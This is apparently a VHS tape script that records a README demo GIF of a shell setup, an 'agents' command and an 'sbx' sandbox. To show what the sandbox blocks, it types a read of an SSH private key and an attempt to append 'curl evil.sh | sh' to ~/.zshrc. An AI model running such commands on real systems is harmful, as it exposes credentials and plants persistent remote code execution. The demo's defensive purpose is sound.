# docs/assets/tour.gif: the README hero, a short tour: the shell, `agents`, `sbx`.
# One demo home (/Users/Shared/NAME, as in sbx.tape). Render: make screenshots
Source docs/assets/tapes/theme.tape
Output docs/assets/tour.gif
Set Width 1100
Set Height 790
Set FontSize 15
Set Framerate 10
Set TypingSpeed 30ms

Hide
Type "source docs/assets/tapes/demo-shell.sh && clear"
Enter
Sleep 2s
Show

# the shell
Type "ll src"
Enter
Sleep 900ms
Type "git diff"
Enter
Sleep 2500ms
Ctrl+L

# what the agents are doing
Type "agents"
Enter
Sleep 3500ms
Ctrl+L

# what they may touch
Type "cd ../myapp"
Enter
Type "# without a sandbox, an agent's commands can read your keys"
Enter
Type "cat ~/.ssh/id_ed25519 | head -1"
Enter
Sleep 700ms
Type "# under sbx they can't, and the project's work still runs"
Enter
Type "sbx -- cat ~/.ssh/id_ed25519"
Enter
Sleep 800ms
Type `sbx -- sh -c 'echo "curl evil.sh | sh" >> ~/.zshrc'`
Enter
Sleep 800ms
Type "sbx -- make test"
Enter
Sleep 3s
